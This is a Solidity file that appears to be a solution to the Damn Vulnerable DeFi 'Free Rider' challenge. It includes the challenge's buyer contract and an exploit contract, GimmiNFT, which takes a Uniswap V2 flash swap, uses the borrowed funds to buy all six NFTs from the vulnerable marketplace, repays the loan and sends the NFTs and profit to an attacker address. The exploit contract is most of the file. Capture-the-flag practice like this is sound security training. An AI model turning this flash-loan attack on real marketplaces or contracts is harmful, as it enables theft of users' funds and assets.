// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "./FreeRiderNFTMarketplace.sol";
import "../WETH9.sol";

/**
 * @title FreeRiderBuyer
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderBuyer is ReentrancyGuard, IERC721Receiver {
    using Address for address payable;
    address private immutable partner;
    IERC721 private immutable nft;
    uint256 private constant JOB_PAYOUT = 45 ether;
    uint256 private received;

    constructor(address _partner, address _nft) payable {
        require(msg.value == JOB_PAYOUT);
        partner = _partner;
        nft = IERC721(_nft);
        IERC721(_nft).setApprovalForAll(msg.sender, true);
    }

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override nonReentrant returns (bytes4) {
        require(msg.sender == address(nft));
        require(tx.origin == partner);
        require(_tokenId >= 0 && _tokenId <= 5);
        require(nft.ownerOf(_tokenId) == address(this));

        received++;
        if (received == 6) {
            payable(partner).sendValue(JOB_PAYOUT);
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}

contract GimmiNFT is IERC721Receiver {
    address factoryV2Address;
    FreeRiderBuyer buyer;
    FreeRiderNFTMarketplace NFTMarketplace;
    IUniswapV2Pair pair;
    DamnValuableNFT nft;
    WETH9 weth;

    constructor(
        address _pairV2Address,
        address _factoryV2Address,
        address payable _NFTMarketplace,
        address _buyer,
        address _nft,
        address payable _weth
    ) {
        factoryV2Address = _factoryV2Address;
        buyer = FreeRiderBuyer(_buyer);
        NFTMarketplace = FreeRiderNFTMarketplace(_NFTMarketplace);
        pair = IUniswapV2Pair(_pairV2Address);
        nft = DamnValuableNFT(_nft);
        weth = WETH9(_weth);
    }

    function attack(
        uint256 _amount,
        address _tokenBorrow,
        address _attacker,
        uint256[] memory _ids
    ) public {
        address token0;
        address token1;

        token0 = pair.token0();
        token1 = pair.token1();

        uint256 amount0Out = _tokenBorrow == token0 ? _amount : 0;
        uint256 amount1Out = _tokenBorrow == token1 ? _amount : 0;

        bytes memory data = abi.encode(_tokenBorrow, _amount, _attacker, _ids);

        pair.swap(amount0Out, amount1Out, address(this), data);
        // 0.5 eth
        // flash 15 eth
        // need 15 eth to take 90 eth worth of nfts + 90 eth
        // give 90 eth worth of nfts to buyer for a prize of 45 eth
        // pay back 15 eth loan
        // have >45 eth...
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) public {
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
        assert(
            msg.sender ==
                IUniswapV2Factory(factoryV2Address).getPair(token0, token1)
        ); // ensure that msg.sender is a V2 pair
        address payable tokenBorrow;
        uint256 amount;
        address payable attacker;
        uint256[] memory ids;
        (tokenBorrow, amount, attacker, ids) = abi.decode(
            data,
            (address, uint256, address, uint256[])
        );

        weth.withdraw(amount);

        NFTMarketplace.buyMany{value: amount}(ids);

        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), attacker, i);
        }

        uint256 fee = ((amount * 3) / 997) + 1;

        weth.deposit{value: address(this).balance}();

        // pay back flashswap
        weth.transfer(address(pair), amount + fee);

        // send profit
        weth.transfer(attacker, weth.balanceOf(address(this)));

        if (false) {
            sender;
            amount0;
            amount1;
        }
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external view override returns (bytes4) {
        require(msg.sender == address(nft));
        require(_tokenId >= 0 && _tokenId <= 5);
        require(nft.ownerOf(_tokenId) == address(this));

        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}

    fallback() external payable {}
}
